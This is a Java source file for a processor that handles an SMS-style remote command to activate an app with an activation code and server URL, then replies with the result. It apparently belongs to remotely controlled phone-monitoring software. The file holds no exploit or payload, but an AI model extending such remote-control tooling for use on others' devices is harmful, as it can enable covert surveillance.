package com.vvt.remotecommandmanager.processor.activationandinstallation;

import java.util.concurrent.CountDownLatch;

import com.vvt.activation_manager.ActivationListener;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.exceptions.FxConcurrentRequestNotAllowedException;
import com.vvt.exceptions.FxExecutionTimeoutException;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;

public class ActivateWithActivationCodeAndURLProcessor extends RemoteCommandProcessor {
	private static final String TAG = "ActivateWithActivationCodeAndURLProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private ActivationManager mActivationManager;
	private CountDownLatch mWaitForResponseLatch;
	
	public ActivateWithActivationCodeAndURLProcessor(AppContext appContext, FxEventRepository eventRepository,
			ActivationManager activationManager) {
		super(appContext,eventRepository);
		
		mReplyMessage = new ProcessingResult();
		mActivationManager = activationManager;
		
	}
	
	@Override
	public ProcessingType getProcessingType() {
		 return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER...");
		
		mWaitForResponseLatch = new CountDownLatch(1);
		
		validateRemoteCommandData(commandData);

		if(commandData.isSmsReplyRequired()) {
			if(commandData.getArguments().size() == 3) {
				mRecipientNumber = commandData.getArguments().get(2);
			}
			else {
				mRecipientNumber = commandData.getSenderNumber();
			}
		}
		
		try {
			String actCode = commandData.getArguments().get(0);
			String url = commandData.getArguments().get(1);

			mActivationManager.activate(url, actCode, mActivationListener);
			
			//Block the thread and wait till onSuccess or onError called.
			try { mWaitForResponseLatch.await(); } catch (InterruptedException e) {
				FxLog.e(TAG, e.getMessage());
			}
			
		} catch (FxConcurrentRequestNotAllowedException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.ACTIVATE_ALREADY_IN_PROCESS);
			
		} catch (FxExecutionTimeoutException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.ACTIVATE_PROCESS_TIMEOUT);
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		FxLog.v(TAG, "doProcessCommand # EXIT...");
	}
	
	ActivationListener mActivationListener = new ActivationListener() {
		
		@Override
		public void onSuccess() {
			if(LOGV) FxLog.v(TAG, "onSuccess # ENTER...");
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(MessageManager.ACTIVATE_SUCCESS);
			
			if(LOGD) FxLog.d(TAG, "onSuccess # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onSuccess # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onSuccess # EXIT...");
			mWaitForResponseLatch.countDown();
			
		}
		
		@Override
		public void onError(ErrorResponseType errorType, int code, String msg) {
			if(LOGV) FxLog.v(TAG, "onError # ENTER...");
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(MessageManager.getErrorMessage(code));
			
			if(LOGD) FxLog.d(TAG, "onError # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onError # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onError # EXIT...");
			mWaitForResponseLatch.countDown(); 
			
		}
	};
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		//Command should only have 2 or 3 (recipient number) arguments. (AC, URL, NUMBER )
		if(!(commandData.getArguments().size() >= 2 && commandData.getArguments().size() <= 3)) {
			throw new InvalidCommandFormatException();
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
